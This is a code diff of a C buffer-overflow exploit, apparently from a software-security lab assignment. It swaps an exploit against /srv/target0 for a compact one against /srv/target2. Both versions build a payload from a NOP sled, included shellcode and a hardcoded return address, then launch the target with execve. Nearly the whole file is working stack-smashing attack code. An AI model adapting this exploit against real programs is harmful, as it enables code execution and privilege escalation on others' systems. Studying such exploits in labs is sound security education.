@@ -5,31 +5,9 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target0"
-
-const int PAYLOAD_SIZE = 408;
-const int SHELLCODE_SIZE = sizeof(shellcode) - 1;
-const uint32_t RETURN_ADDR = 0xffffdb2c;
-
-int main(void)
-{
-    char *args[3];
-    char *env[1];
-
-    char payload[PAYLOAD_SIZE + 1];
-    memset(payload, 0x90, PAYLOAD_SIZE);
-    payload[PAYLOAD_SIZE] = '\0';
-    memcpy(payload, shellcode, SHELLCODE_SIZE);
-    *(uint32_t*)(payload + PAYLOAD_SIZE - 4) = RETURN_ADDR;
-
-    args[0] = TARGET;
-    args[1] = payload;
-    args[2] = NULL;
-
-    env[0] = NULL;
-
-    execve(TARGET, args, env);
-    fprintf(stderr, "execve failed.\n");
-
-    return 0;
-}
+#define T "/srv/target2"
+const int S=409,O=201;const uint32_t R=0xffffdb5c;
+void f(char*b){memset(b,0x90,S-1);memcpy(b+O,shellcode,sizeof(shellcode)-1);
+for(int i=O+sizeof(shellcode)-1;i<S-1;i+=4)*(uint32_t*)(b+i)=R;b[S-1]=0;}
+int main(void){char*a[4],*e[1],b[S];f(b);a[0]=T;a[1]=b;a[2]="65935";
+a[3]=NULL;e[0]=NULL;execve(T,a,e);fprintf(stderr,"execve failed.\n");return 0;}
